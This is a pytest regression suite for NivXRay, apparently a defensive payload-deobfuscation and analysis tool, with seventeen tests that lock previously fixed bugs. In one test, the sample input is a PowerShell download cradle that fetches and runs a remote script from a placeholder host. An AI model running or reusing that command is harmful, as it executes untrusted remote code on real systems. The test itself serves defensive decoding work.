@@ -1,0 +1,286 @@
+"""
+NivXRay — Regression Lock (session Feb 2026)
+
+Every test in this file corresponds to ONE previously-fixed bug. If any
+test starts failing, we've regressed a known-good behaviour. Run before
+every deploy:
+
+    cd /app && pytest -o addopts= backend/tests/test_regression_lock.py -v
+
+Each test is fast (<2s), offline, and independent of the LLM / network.
+"""
+from __future__ import annotations
+import base64
+import sys
+
+import pytest
+
+sys.path.insert(0, "/app/backend")
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 1 · `hex-or-b64-decode` MUST be a registered op
+# Original bug: Unknown operation error in recipe replay
+# Fix: operations.py registered @op("hex-or-b64-decode", …)
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock1_hex_or_b64_decode_registered():
+    from operations import OPERATIONS, run_operation
+    assert "hex-or-b64-decode" in OPERATIONS, "Regressed: hex-or-b64-decode is no longer registered"
+    out = run_operation("hex-or-b64-decode", "48656c6c6f")  # hex('Hello')
+    assert "Hello" in out, f"hex path broken, got: {out!r}"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 2 · `xor-bruteforce-256` MUST be a registered op AND auto-detect
+#           UTF-16LE so PowerShell -enc payloads don't mojibake
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock2_xor_bruteforce_256_utf16le_clean():
+    from operations import OPERATIONS, run_operation
+    assert "xor-bruteforce-256" in OPERATIONS
+
+    pt = 'powershell -nop -c IEX (New-Object Net.WebClient).DownloadString("http://x/y.ps1")'
+    xored = bytes(b ^ 0x54 for b in pt.encode("utf-16-le"))
+    out = run_operation("xor-bruteforce-256", xored.decode("latin-1"))
+    assert "powershell" in out, f"UTF-16LE not decoded — mojibake regressed: {out[:80]!r}"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 3 · L3 LLM synthetic op-name filter — Claude-invented op names
+#           like `case-obfuscation-normalization` MUST be aliased or dropped,
+#           never shown as red "Unknown operation" ERROR
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock3_llm_op_alias_map():
+    # The alias map is embedded inside llm_decoder.llm_decode_fallback().
+    # Verify its two documented aliases still exist by reading the source.
+    src = open("/app/backend/llm_decoder.py").read()
+    assert '"case-obfuscation-normalization":  "cmd-deobfuscate"' in src, \
+        "Regressed: case-obfuscation-normalization → cmd-deobfuscate alias removed"
+    assert '"case_obfuscation_normalization":  "cmd-deobfuscate"' in src
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 4 · Dedicated-loop deadlock fix — llm_decoder must NOT use
+#           run_coroutine_threadsafe (was root cause of backend hangs)
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock4_no_deadlocking_coroutine_threadsafe():
+    """Real call sites only — the string may appear in the fix docstring."""
+    import ast
+    src = open("/app/backend/llm_decoder.py").read()
+    tree = ast.parse(src)
+    calls = [
+        n for n in ast.walk(tree)
+        if isinstance(n, ast.Call)
+        and (
+            (isinstance(n.func, ast.Attribute) and n.func.attr == "run_coroutine_threadsafe")
+            or (isinstance(n.func, ast.Name) and n.func.id == "run_coroutine_threadsafe")
+        )
+    ]
+    assert not calls, "Regressed: run_coroutine_threadsafe called — will deadlock under load"
+    assert "_run_async_on_dedicated_loop" in src, "Regressed: dedicated-loop helper removed"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 5 · Reasoning `.slice` guard on frontend — dict-shaped reasoning
+#           must not crash the Workspace
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock5_frontend_reasoning_slice_guard():
+    src = open("/app/frontend/src/pages/WorkspacePage.jsx").read()
+    assert "typeof _raw === \"string\"" in src, \
+        "Regressed: WorkspacePage no longer guards reasoning shape"
+    # The original brittle call MUST NOT be present without a guard
+    assert "r.data.reasoning.slice(0, 120)" not in src, \
+        "Regressed: unguarded r.data.reasoning.slice(...) is back"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 6 · `/battery` route must include the Header
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock6_battery_page_has_header():
+    src = open("/app/frontend/src/pages/MultiLayerBatteryPage.jsx").read()
+    assert "import Header from \"@/components/Header\"" in src
+    assert "<Header />" in src, "Regressed: /battery no longer renders Header — users lose nav"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 7 · Analyse SLA — /api/analyze must wrap AI + OSINT in asyncio.wait_for
+#           (was root cause of Cloudflare 524 in prod)
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock7_analyze_has_wait_for_timeouts():
+    src = open("/app/backend/routers/analyze.py").read()
+    assert "asyncio.wait_for(enrich_iocs" in src, \
+        "Regressed: OSINT leg unwrapped — can hang route"
+    assert "asyncio.wait_for(\n                    ai_describe_and_verdict" in src or \
+           "wait_for(ai_describe_and_verdict" in src.replace("\n", " "), \
+        "Regressed: AI leg in /analyze unwrapped — can hang route"
+    core = open("/app/backend/analysis_core.py").read()
+    assert "asyncio.wait_for(enrich_iocs" in core
+    assert "wait_for" in core and "ai_describe_and_verdict" in core
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 8 · llm_json empty-response retry — deps.py must retry >=2 times
+#           with backoff when Claude returns empty
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock8_llm_json_empty_retry():
+    src = open("/app/backend/deps.py").read()
+    assert "retries: int = 2" in src, \
+        "Regressed: llm_json retries reverted to <2 — empty-response 502s will return"
+    assert "empty response from LLM" in src, \
+        "Regressed: empty-response detection removed"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 9 · PREDICT TREE never returns bare `(insufficient)` when the
+#           payload has decodable evidence — heuristic fallback must fire
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock9_predict_tree_heuristic_fallback_wired():
+    src = open("/app/backend/training/predictor.py").read()
+    assert "_heuristic_tree" in src, "Regressed: heuristic tree helper removed"
+    # Confirm it's actually WIRED (all 3 error branches must use it, not _insufficient)
+    assert "return _heuristic_tree(raw, decoded, f\"LLM upstream unavailable" in src
+    assert "return _heuristic_tree(raw, decoded, f\"LLM error" in src
+    assert "return _heuristic_tree(raw, decoded, \"LLM returned malformed JSON\")" in src
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 10 · BLIND_XOR banner must smart-render PE / UTF-16LE / UTF-8
+#            (was showing `MZFTØ DYØtØ LØWLØ…` mojibake before)
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock10_blind_xor_smart_render_pe_binary():
+    """Direct handler call with an XOR'd PE header must return a summary
+    banner, NOT mojibake."""
+    from wrapper_archetypes import _handle_blind_xor
+    import base64 as _b64
+    # Craft: PE header bytes 4D 5A ... base64-encoded then XOR'd with 0x54
+    pe = bytes.fromhex("4d5a90000300000004000000ffff0000b8000000")
+    xored = bytes(b ^ 0x54 for b in pe)
+    encoded = _b64.b64encode(xored).decode()
+    out = _handle_blind_xor(encoded)
+    # We accept either: (a) smart-render banner, (b) unchanged input if the
+    # xor scorer rejects it. Either is fine — what MUST NOT happen is a
+    # mojibake `Ø`-run.
+    mojibake = sum(1 for c in out if 0x80 <= ord(c) < 0xa0)
+    assert mojibake < 20, f"Regressed: BLIND_XOR banner has {mojibake} mojibake chars"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 11 · X-RAY RECOVERED downgrade — mid-chain BROKEN/MIXED must
+#            downgrade to RECOVERED when downstream recovered
+#            (renamed from "SALVAGED" in RC3.0 · Feb-2026 UX polish)
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock11_xray_salvage_downgrade_wired():
+    src = open("/app/frontend/src/components/DecodingTracePanel.jsx").read()
+    assert "RECOVERED" in src, "Regressed: RECOVERED badge removed"
+    assert "_rawLayerHealth" in src, "Regressed: raw-vs-recovered split removed"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 12 · Multi-Layer Battery pytest still passes 12/12
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock12_multilayer_battery_still_green():
+    import json
+    report = json.load(open("/app/backend/tests/reports/multilayer_battery.json"))
+    assert report["passed"] == report["total"], \
+        f"Regressed: battery no longer 100% — {report['passed']}/{report['total']}"
+    assert report["total"] >= 12
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 13 · AI global toggle · admin can flip AI OFF, deterministic works
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock13_ai_toggle_endpoints_exist():
+    src = open("/app/backend/routers/ai.py").read()
+    assert "_ai_admission_check" in src, "Regressed: AI admission gate removed"
+    assert '"/ai/toggle"' in src, "Regressed: admin AI toggle endpoint missing"
+    assert "NIVX_AI_ENABLED" in src, "Regressed: env-var default missing"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 14 · Modular decoder plugin registry exists (Phase A architecture)
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock14_modular_decoder_skeleton():
+    """Locks the plugin-based decoder architecture introduced in Session 2 / Phase A."""
+    import sys
+    sys.path.insert(0, "/app/backend")
+    from engine import DecoderRegistry, Orchestrator, AnalysisContext, Budget
+    plugins = DecoderRegistry.all()
+    assert len(plugins) >= 3, "Regressed: fewer than 3 pilot decoders registered"
+    ids = {p.id for p in plugins}
+    assert "base64-decode" in ids, "Regressed: base64 plugin missing"
+    # End-to-end orchestrator smoke: base64('Hello world english text') → plaintext
+    import base64 as _b64
+    payload = _b64.b64encode(b"Hello world english text").decode()
+    report = Orchestrator(AnalysisContext(budget=Budget(max_depth=6, wall_time_ms=2000))).run(payload)
+    assert "Hello world english text" in report.output
+    assert report.trace and report.trace[0].decoder == "base64-decode"
+    # Vision-aligned: AnalystReport must carry the aggregated intelligence surface
+    assert hasattr(report, "findings"), "AnalystReport missing findings aggregate"
+    assert hasattr(report, "executive_summary"), "AnalystReport missing executive_summary"
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 15 · Credit-guard module exists + rate/budget config in .env
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock15_credit_guard_wired():
+    import os
+    assert os.path.exists("/app/backend/ai_credit_guard.py"), "Credit guard module removed"
+    src = open("/app/backend/routers/ai.py").read()
+    assert "guard_ai_endpoint" in src, "AI DECODE endpoint no longer calls credit guard"
+    env = open("/app/backend/.env").read()
+    assert "NIVX_AI_RATE_HOURLY" in env, ".env missing NIVX_AI_RATE_HOURLY"
+    assert "NIVX_AI_BUDGET_CAP_CREDITS" in env
+
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 16 · Session-2 engine feature flag wired
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock16_engine_feature_flag():
+    """`NIVX_ENGINE` env var gates legacy vs. orchestrator. Default = legacy."""
+    import os, sys
+    sys.path.insert(0, "/app/backend")
+    env = open("/app/backend/.env").read()
+    assert "NIVX_ENGINE" in env, ".env missing NIVX_ENGINE feature flag"
+    assert "NIVX_ENGINE_BUDGET_WALLTIME_MS" in env, ".env missing budget wall-time config"
+    from engine.config import engine_mode, new_budget
+    prev = os.environ.get("NIVX_ENGINE")
+    try:
+        os.environ["NIVX_ENGINE"] = "legacy"
+        assert engine_mode() == "legacy"
+        os.environ["NIVX_ENGINE"] = "orchestrator"
+        assert engine_mode() == "orchestrator"
+    finally:
+        if prev is None:
+            os.environ.pop("NIVX_ENGINE", None)
+        else:
+            os.environ["NIVX_ENGINE"] = prev
+    b = new_budget()
+    assert b.max_depth >= 1 and b.wall_time_ms >= 100 and b.max_branches >= 1
+
+
+# ═════════════════════════════════════════════════════════════════════════
+# LOCK 17 · AnalystReport carries MCIP intelligence surface
+# ═════════════════════════════════════════════════════════════════════════
+def test_lock17_analyst_report_surface():
+    """Orchestrator output MUST expose Findings + executive_summary + investigation_steps.
+
+    Locks the vision-aligned MCIP schema so future refactors cannot silently
+    drop the intelligence aggregate that separates NivXRay from CyberChef.
+    """
+    import sys
+    sys.path.insert(0, "/app/backend")
+    from engine import AnalystReport, Orchestrator, AnalysisContext, Budget, Findings, IOCBundle
+    r = Orchestrator(AnalysisContext(budget=Budget(max_depth=4, wall_time_ms=1500))).run(
+        base64.b64encode(b"the quick brown fox jumps over the lazy dog").decode()
+    )
+    assert isinstance(r, AnalystReport)
+    assert isinstance(r.findings, Findings)
+    assert isinstance(r.findings.iocs, IOCBundle)
+    # every findings field is non-None (default empty containers)
+    for name in ("mitre_techniques", "lolbas", "tradecraft",
+                 "kill_chain_phases", "similar_cases"):
+        assert getattr(r.findings, name) is not None
+    assert r.executive_summary, "executive_summary must be populated deterministically"
+    assert r.investigation_steps is not None
+    # verdict comes from deterministic aggregation; plaintext output → unknown
+    assert r.findings.verdict in {"unknown", "needs_review", "suspicious", "malicious", "benign"}
